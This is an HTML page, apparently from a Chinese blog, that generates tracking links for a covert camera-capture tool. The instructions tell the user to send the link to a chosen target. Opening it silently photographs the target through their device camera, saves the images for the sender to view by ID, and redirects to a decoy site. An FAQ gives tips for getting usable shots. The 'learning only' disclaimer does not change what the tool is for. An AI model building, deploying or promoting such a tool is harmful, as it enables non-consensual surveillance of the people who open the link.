<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>网恋翻车之乔碧萝你别跑！！- 此源码来自小歪博客 blog.ixiaowai.cn</title>
</head>
  <BODY>
   <script>
function  create() {
    var input = document.getElementById('content');
    var kd = document.getElementById('kd');
    var myid = document.getElementById('myid');
    var url = document.getElementById('url');
    if (myid.value=="" || url.value==""){
        alert("ID或跳转地址不能为空！");
        return false;
    }
    kd.href = 'http://127.0.0.1/01/?id='+myid.value+'&url='+url.value; 
    kd.style = ''; 
    kd.innerText = 'http://127.0.0.1/01/?id='+myid.value+'&url='+url.value; 
}
   </script>
   <p>1.本工具仅做学习交流使用，请勿用于非法用途！后果自负！</p>
   <p>2.懒得做数据库，ID是查看照片的凭证，不要泄露给知道这个平台的人</p>
   <p>3.为节省服务器资源，不定期删除7天前的数据</p>
   <p>输入ID：<input type= "text" id="myid"  value= ''/></p>
   <p>拍摄后跳转到：<input type= "text" id="url"  value= 'http://baidu.com'/></p>
   <p><input type= "button"  value= '生成链接'  onclick= 'create();'  />   <input type="button" value='查看照片' onclick=window.location.href='ck.php?id='+document.getElementById('myid').value> </p>
   <p>将以下链接地址发送给你要拍摄的对象，对方进入后将会拍摄照片并保存</p>
   <p><a id="kd" style="pointer-events: none;">请先生成链接！</a></p>
   <p>问题一：为什么拍摄的是黑屏？答：因为该浏览器不支持，更换浏览器即可，安卓用户建议直接在QQ内打开链接</p>
   <p>问题二：拍摄的照片不全？答：还没等跳转完成就关闭了页面，数据还没传输完成</p>
  </BODY>
  
      <footer>
        <p><a href="http://blog.ixiaowai.cn" title="小歪博客" >小歪博客</a></p>
     
    </footer>
</HTML>
